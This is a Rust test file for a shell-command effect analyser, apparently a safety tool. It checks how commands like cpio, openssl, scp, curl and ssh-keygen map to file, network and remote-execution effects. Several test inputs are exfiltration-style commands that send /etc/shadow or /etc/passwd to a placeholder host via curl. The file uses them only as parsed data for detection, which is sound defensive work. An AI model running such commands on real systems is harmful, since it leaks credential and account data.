//! Regression coverage for audited Profile effect gaps. These commands are
//! parsed and modeled only; no sample command is executed.
use caushell_parse::parse_command;
use caushell_profile::*;
use caushell_types::ShellKind;

fn resolve(command: &str) -> BoundInvocation {
    let parsed = parse_command(command, ShellKind::Bash).unwrap();
    match resolve_invocation_with_bindings(
        &ProfileRegistry::built_in().unwrap(),
        &parsed.commands[0],
        InvocationRuntimeContext::default(),
        &SessionBindings::new(),
    ) {
        ResolveInvocationResult::Resolved(r) => r.bound,
        other => panic!("{command}: {other:#?}"),
    }
}

fn values(bound: &BoundInvocation, name: &str) -> Vec<String> {
    bound
        .bound_parameters
        .iter()
        .filter(|p| p.name.as_str() == name)
        .flat_map(|p| &p.values)
        .map(|v| match v {
            BoundValue::Argument { text, .. } => text.clone(),
            other => panic!("{name}: {other:#?}"),
        })
        .collect()
}

fn has(bound: &BoundInvocation, kind: EffectKind, slot: &str) -> bool {
    bound.effects.iter().any(|effect| {
        effect.kind == kind
            && matches!(&effect.target, EffectTarget::Slot(name) if name.as_str() == slot)
    })
}

fn has_kind(bound: &BoundInvocation, kind: EffectKind) -> bool {
    bound.effects.iter().any(|effect| effect.kind == kind)
}

fn has_unknown_write(bound: &BoundInvocation) -> bool {
    bound.effects.iter().any(|effect| {
        effect.kind == EffectKind::WritePath
            && matches!(
                &effect.target,
                EffectTarget::ConfiguredPath(path)
                    if path.missing == ConfiguredPathMissing::Unknown
            )
    })
}

#[test]
fn cpio_selection_patterns_are_data_in_each_copy_in_form() {
    for command in [
        "cpio -it '*.conf'",
        "cpio -i --to-stdout '*.conf'",
        "cpio -i --only-verify-crc '*.conf'",
        "cpio -i '*.conf'",
        "cpio -i -F archive.cpio '*.conf'",
    ] {
        let bound = resolve(command);
        assert_eq!(values(&bound, "member_patterns"), ["*.conf"], "{command}");
        assert!(!has(&bound, EffectKind::ReadPath, "member_patterns"));
        assert!(!has(&bound, EffectKind::WritePath, "member_patterns"));
    }
}

#[test]
fn openssl_commands_preserve_file_and_network_effects_without_promoting_information() {
    for command in ["openssl version", "openssl version -a"] {
        let b = resolve(command);
        assert!(!b.effects.iter().any(|e| matches!(
            e.kind,
            EffectKind::ReadPath | EffectKind::WritePath | EffectKind::NetworkEndpoint
        )));
    }
    let digest = resolve("openssl dgst -sha256 /etc/passwd");
    assert!(
        digest
            .effects
            .iter()
            .any(|e| e.kind == EffectKind::ReadPath)
    );
    let request = resolve("openssl req -new -key key.pem -out /opt/out.csr");
    assert!(
        request
            .effects
            .iter()
            .any(|e| e.kind == EffectKind::ReadPath)
    );
    assert!(
        request
            .effects
            .iter()
            .any(|e| e.kind == EffectKind::WritePath)
    );
    let client = resolve("openssl s_client -connect example.test:443 </tmp/request");
    assert!(has_kind(&client, EffectKind::ConsumeStdin));
    assert!(client
        .bound_parameters
        .iter()
        .any(|p| p.name.as_str() == "server"
            && matches!(
                &p.semantic,
                SemanticType::Endpoint(endpoint) if endpoint.usage == EndpointUsage::UploadTarget
            )));
    assert!(
        client
            .effects
            .iter()
            .any(|e| e.kind == EffectKind::NetworkEndpoint)
    );
    let encrypted = resolve("openssl des3 -salt -in /tmp/plain -out /tmp/cipher");
    assert!(
        encrypted
            .effects
            .iter()
            .any(|e| e.kind == EffectKind::ReadPath)
    );
    assert!(
        encrypted
            .effects
            .iter()
            .any(|e| e.kind == EffectKind::WritePath)
    );
}

#[test]
fn scp_distinguishes_remote_endpoints_cipher_program_and_shell_proxy_command() {
    let remote = resolve("scp -3 user@a.test:/in user@b.test:/out");
    assert!(
        remote
            .effects
            .iter()
            .any(|e| e.kind == EffectKind::NetworkEndpoint)
    );
    assert!(
        !remote
            .effects
            .iter()
            .any(|e| matches!(e.kind, EffectKind::ReadPath | EffectKind::WritePath))
    );

    let cipher = resolve("scp -c aes256-gcm@openssh.com user@a.test:/in /tmp/out");
    assert_eq!(values(&cipher, "cipher"), ["aes256-gcm@openssh.com"]);
    assert!(
        cipher
            .effects
            .iter()
            .any(|e| e.kind == EffectKind::WritePath)
    );

    let program = resolve("scp -S /usr/bin/ssh /tmp/in user@b.test:/out");
    assert_eq!(values(&program, "transport_program"), ["/usr/bin/ssh"]);
    assert!(
        !program
            .effects
            .iter()
            .any(|e| e.kind == EffectKind::ExecutePayload)
    );

    let proxy = resolve("scp -o 'ProxyCommand=ssh -W %h:%p jump.test' /tmp/in user@b.test:/out");
    assert!(
        !collect_dispatch_command_projection(&proxy)
            .unresolved
            .is_empty(),
        "OpenSSH % substitutions must remain unknown without tool-specific substitution facts"
    );
}

#[test]
fn ln_one_operand_tracks_current_directory_destination_and_reference_is_not_a_link_name() {
    let b = resolve("ln -s ../config/init");
    assert!(has(&b, EffectKind::TargetPath, "link_targets"));
    assert!(has_kind(&b, EffectKind::WritePath));

    let b = resolve("ln -s ../config/init /opt/alias");
    assert!(has(&b, EffectKind::WritePath, "link_path"));

    // The basename-derived write is anchored to cwd by the shared path layer.
}

#[test]
fn chown_reference_uses_metadata_and_mutates_only_the_targets() {
    let b = resolve("chown --reference=/etc/passwd -- /opt/file");
    assert_eq!(values(&b, "reference_path"), ["/etc/passwd"]);
    assert!(has(&b, EffectKind::TargetPath, "reference_path"));
    assert!(!has(&b, EffectKind::ReadPath, "reference_path"));
    assert!(has(&b, EffectKind::MetadataMutation, "path_targets"));
}

#[test]
fn setfacl_accepts_repeated_modify_specs_as_a_single_operation_family() {
    let b = resolve("setfacl -m u:alice:rwx -m g:staff:rx /opt/file");
    assert_eq!(values(&b, "acl_spec").len(), 2);
    assert!(
        b.effects
            .iter()
            .any(|e| e.kind == EffectKind::MetadataMutation)
    );
}

#[test]
fn zip_move_deletes_inputs_only_for_archive_creation_and_keeps_test_boundary() {
    let b = resolve("zip -P secret -m archive.zip one two");
    assert_eq!(values(&b, "password"), ["secret"]);
    assert!(b.effects.iter().any(|e| e.kind == EffectKind::WritePath));
    assert!(b.effects.iter().any(|e| e.kind == EffectKind::DeletePath));

    let tested = resolve("zip -j -m -T archive.zip one");
    assert!(
        tested
            .effects
            .iter()
            .any(|e| e.kind == EffectKind::DeletePath)
    );
    let listing = resolve("zip -h");
    assert!(
        !listing
            .effects
            .iter()
            .any(|e| matches!(e.kind, EffectKind::WritePath | EffectKind::DeletePath))
    );
}

#[test]
fn pax_substitution_does_not_turn_archive_members_into_known_host_paths() {
    let b = resolve("pax -r -s ',^old/,new/,' -f /opt/archive");
    assert_eq!(values(&b, "substitution_expression"), [",^old/,new/,"]);
    assert!(has(&b, EffectKind::ReadPath, "archive_input_path"));
    assert!(has_kind(&b, EffectKind::WritePath));
}

#[test]
fn tar_and_cpio_remote_archives_keep_the_remote_boundary() {
    // Remote archive transport is opaque execution, not local file access.
    for command in [
        "tar xvf user@host.test:/path/archive.tar --rsh-command=/usr/bin/ssh",
        "cpio -i -F user@host.test:/path/archive.cpio --rsh-command=/usr/bin/ssh",
    ] {
        let bound = resolve(command);
        assert!(
            has_kind(&bound, EffectKind::ExecuteRemoteCommand),
            "{command}"
        );
        assert!(
            bound.effects.iter().any(|e| e.state_operation.is_some()),
            "{command}"
        );
        assert!(
            !bound.effects.iter().any(|e| matches!(
                e.kind,
                EffectKind::ReadPath | EffectKind::WritePath | EffectKind::DeletePath
            )),
            "remote paths must not become local paths: {command}: {bound:#?}"
        );
    }
}

#[test]
fn curl_upload_source_and_response_output_remain_independent() {
    let b = resolve("curl --data-binary @/etc/shadow -o /dev/null https://example.test/submit");
    assert!(b.effects.iter().any(|e| e.kind == EffectKind::ReadPath));
    assert!(
        b.effects
            .iter()
            .any(|e| e.kind == EffectKind::NetworkEndpoint)
    );
    // Keep the real content-open write to /dev/null; the path guard, not
    // Profile erasure, grants the null-device exemption.
    assert!(b.effects.iter().any(|e| e.kind == EffectKind::WritePath));

    let b = resolve("curl -T /etc/passwd https://example.test/upload");
    assert!(b.effects.iter().any(|e| e.kind == EffectKind::ReadPath));
    assert!(
        b.effects
            .iter()
            .any(|e| e.kind == EffectKind::NetworkEndpoint)
    );

    for command in [
        "curl --data-raw @/etc/passwd https://example.test/",
        "curl --form-string 'data=@/etc/passwd' https://example.test/",
    ] {
        let b = resolve(command);
        assert!(
            !b.effects.iter().any(|e| e.kind == EffectKind::ReadPath),
            "{command}: {b:#?}"
        );
    }
    let stdin = resolve("curl --data-binary @- https://example.test/");
    assert!(!stdin.effects.iter().any(|e| e.kind == EffectKind::ReadPath));
    assert!(has_kind(&stdin, EffectKind::ConsumeStdin));

    let explicit = resolve("curl --data-urlencode 'name@/etc/shadow' --url https://example.test/");
    assert!(has(&explicit, EffectKind::ReadPath, "urlencode_file"));
    assert!(has_kind(&explicit, EffectKind::NetworkEndpoint));
    let form = resolve("curl -F 'payload=@/etc/shadow' https://example.test/");
    assert!(has(&form, EffectKind::ReadPath, "form_file"));
    let trace = resolve("curl --trace % https://example.test/");
    assert!(!has_kind(&trace, EffectKind::WritePath));
}

#[test]
fn curl_auxiliary_paths_cover_inputs_outputs_and_credentials_stay_local() {
    let b = resolve(
        "curl -b /opt/cookies -c /opt/jar --cert /opt/client.pem --key /opt/client.key -D /opt/headers --trace /opt/trace https://example.test/",
    );
    assert!(has_kind(&b, EffectKind::ReadPath));
    assert_eq!(values(&b, "certificate_operand"), ["/opt/client.pem"]);
    assert_eq!(values(&b, "authentication_key"), ["/opt/client.key"]);
    assert!(has(&b, EffectKind::ReadPath, "authentication_key"));
    assert!(
        b.bound_parameters
            .iter()
            .any(|p| p.name.as_str() == "cookie_file")
    );
    assert!(has_kind(&b, EffectKind::WritePath));
    assert_eq!(values(&b, "auxiliary_output_operand"), ["/opt/headers"]);
    assert_eq!(values(&b, "trace_operand"), ["/opt/trace"]);
    assert!(
        !b.effects
            .iter()
            .any(|e| e.kind == EffectKind::NetworkEndpoint
                && matches!(&e.target, EffectTarget::Slot(slot) if slot.as_str() == "authentication_key"))
    );
}

#[test]
fn strace_and_script_recording_distinguish_files_from_null_and_stdout() {
    let log = resolve("strace -o /opt/trace.log /bin/true");
    assert!(has(&log, EffectKind::WritePath, "output_path"));
    let null = resolve("strace -o /dev/null /bin/true");
    assert!(has(&null, EffectKind::WritePath, "output_path"));

    let record = resolve("script -q /opt/typescript");
    assert!(
        record
            .effects
            .iter()
            .any(|e| e.kind == EffectKind::WritePath)
    );
    let no_file = resolve("script -q /dev/null");
    assert!(
        no_file
            .effects
            .iter()
            .any(|e| e.kind == EffectKind::WritePath)
    );
    let stdout = resolve("script -q -c 'echo ok' -");
    // util-linux script treats '-' as the literal recording filename.
    assert!(
        stdout
            .effects
            .iter()
            .any(|e| e.kind == EffectKind::WritePath)
    );
}

#[test]
fn cpio_extract_and_mount_all_do_not_fall_through_to_read_only_forms() {
    let extract = resolve("cpio -idmv < /opt/archive.cpio");
    assert!(has_unknown_write(&extract));
    let list = resolve("cpio -it < /opt/archive.cpio");
    assert!(!list.effects.iter().any(|e| e.kind == EffectKind::WritePath));
    let to_stdout = resolve("cpio -i --to-stdout file < /opt/archive.cpio");
    assert!(
        !to_stdout
            .effects
            .iter()
            .any(|e| e.kind == EffectKind::WritePath)
    );

    let all = resolve("mount -a");
    assert!(has_kind(&all, EffectKind::StateOperation));
    assert!(!all.effects.iter().any(|e| e.kind == EffectKind::ReadPath
        && matches!(&e.target, EffectTarget::ToolConventionPath(_))));
}

#[test]
fn ssh_keygen_covers_compact_options_companions_and_unknown_prompt_targets() {
    let known = resolve("ssh-keygen -Hf /opt/known_hosts");
    assert!(values(&known, "key_path").contains(&"/opt/known_hosts".to_owned()));
    assert!(
        known
            .effects
            .iter()
            .any(|e| e.kind == EffectKind::WritePath)
    );
    let private = resolve("ssh-keygen -pf /opt/id_rsa");
    assert!(has_kind(&private, EffectKind::ReadPath));
    assert!(has_kind(&private, EffectKind::WritePath));
    let generated = resolve("ssh-keygen -t ed25519");
    assert!(has_unknown_write(&generated));
    let explicit = resolve("ssh-keygen -t ed25519 -f /opt/id_ed25519");
    assert!(
        explicit
            .effects
            .iter()
            .any(|e| e.kind == EffectKind::WritePath)
    );
}

#[test]
fn rlwrap_models_conditional_log_history_rewrite_and_filter_as_code() {
    let b = resolve("rlwrap -l /opt/session.log -H /opt/history -z 'cat /opt/filter' cat");
    assert!(b.effects.iter().any(|e| e.kind == EffectKind::WritePath));
    assert!(b.effects.iter().any(|e| e.kind == EffectKind::ReadPath));
    assert_eq!(collect_dispatch_command_candidates(&b).len(), 1);
    assert_eq!(
        collect_dispatch_command_candidates(&b)[0].command.text,
        "cat"
    );
    let payloads = collect_recursive_payload_candidates(&b);
    assert_eq!(payloads.len(), 1);
    assert_eq!(payloads[0].language, PayloadLanguage::Opaque);
    assert_eq!(values(&b, "filter_program"), ["cat /opt/filter"]);
    assert!(!values(&b, "wrapped_args").contains(&"/opt/session.log".to_owned()));
}
